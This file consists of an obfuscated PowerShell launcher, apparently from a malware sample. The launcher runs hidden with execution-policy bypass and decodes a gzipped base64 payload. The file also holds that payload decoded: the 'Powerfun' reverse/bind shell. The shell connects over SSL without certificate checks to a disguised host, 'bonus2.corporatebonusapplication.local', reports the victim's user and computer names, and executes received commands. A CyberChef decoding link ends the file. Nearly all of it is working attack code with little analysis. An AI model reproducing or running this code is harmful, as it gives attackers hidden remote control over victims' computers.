powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"


------------------------------------------------------------------------------------------------------------------------

# Powerfun - Written by Ben Turner & Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true

------------------------------------------------------------------------------------------------------------------------


# Decode with CyberChef
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFPVy9VV0VDQTUxVzIyN2pOaEI5OTFjTVhIVXRJUmJoZGJkQUVTQ0xlcFZzR3lEZE5WWnU4MkFZQ0UyTll6VXlxWktVTDBqODd5VWx5cExqQk50VUw3YUdjemx6NWtMOUFHT3hRYmtvT0lSd0sxT3RrY044QjUvTXo2U1FIQ1c4ZzB1NlJ2aWR5bVRYNlJoTnBsUEI0VGZVNFMzT1daWWkxOUI1N0lCNXZBMkRDL2lDbS9Eci9HOWtHc0xKTHNjdmRJVkdxSW5SajByOVdwbjhxZkFTRjdUSWRDUXhNU2NwelpSeDRXbFo0RUZyTE1WMlI1NXBHSGxMVXV0MjlnM0V2RTZ0OHdqbCtaaEt1dktyLzlOWXk1VGZ6N3hJckZhVUovMWphYXd5SnZnejRhWFk4RXpRcEpRR3pxY1VESlVDUjhCS0pFV0dGdUN2ZmdDVlNyb0F2dzRESWY0RDNYbktrMjVRSGxaMnBXMldLa08vb2Z6Q2hOeVoveXRpV1lzRmUwQ3R5SVRsTjA1ajlzdUhEeitkR2hLbHFkUTJyb3RjbnJvU1hiVDBSb3hocm8zRHFoeCtCV1gvR2x5SmE1UUtUeEVmWExkSy9oTHlhT3dDZGVlQ0YycEltSkM1a0ZSaitVN3pQRXNadFVVam1XQTA2L1p0Z2c1VnAySldhWWwwWmRPb29oTFRnWEVwTS9BYjRGWGhLdHkyaWJxdVRpM1VTbVZ4N2V3VjRNZ0tNd3c3RXRlcXZvdmY5eGFtMjdEdlAzb1Q0MzBQSVZVd1BiTDVoaXVoTVVLcDA0WE5DditpV1pxVTJVVTB5K2FVUGN5QzRBVTRaRlRvcGUxbmF6UlNiNlFzYUpXODRhckp0VTNtZEw3VE9KM05QUHRybTNWQXlIQmducWNmSHdkN3h6ZnlwRDcycHhxM21pQm5JckdUY0g0K2lxUHI2OERXNEpQVjhidTNwcVhGUmxYN0pGNWlsb0VzT0RmYVlCZ3FsR25yTHB5QmgzeDlidCs0WFFwblJtYUtkVGhnWXBVWHVqbTg0NUhJZHpLOVgycndvd0NHZy9jL3d4OHBrMEtKaFliSVVXSkpnSkdOYURVVlNEUUIxcGlRTzM3SFhkYzZUb2hkY3VnMzJmVUgvZWFGM0NDLzE4dDJQOVV6Mys2b2s0WjZHMVhUc3huY0dKZVdHN2N2eUFIbjI3SFdWcCtGdktKc2FUQlhUaUhsaDMzVWFEV3c3ZU1mcmZHQTFObFdHNi8yRkR4ZDg3VjR3UEJxbXh0dWxlSDc0R1YvUEtSdllxSTNqcUZuNmx5aXVCRlZPd2RrVFBYU1NIc2ZlLys3ZEp0bG1xSHZlMms1QTVYNU42U0pYM1Y4SHdaOThJN3NBZ2c1d3VDa3RsY1dQaVlUazhwclY1dGJIRmFGbENsZXVaUWJMMmI4cVlYUzh1YjJWMGx6blE1NGFmQ3NyY3kyc0Z5ZUZBRENla1ZYem9jZjM3MkhKL2hhNkxEeUNvNktJMWRES0FtcEhSdVN2MU1DNkRWT3RoYUloMUlLT1IzTWpvSzFVSmZuaEdWSXBSKzhoT0NpL1dJR2Y5czVuYVQvMUQ2Tm0rK09UcnRWVGdhbnR2bWNGV3A1dUxYZEduU1hUWlFKaFM2ZjVoNk50Y2pyeTlOOGVYUU9YeHlINHJpckUwSjNMOWtGOGkvbXRsOTNkUWtBQUE9PQ
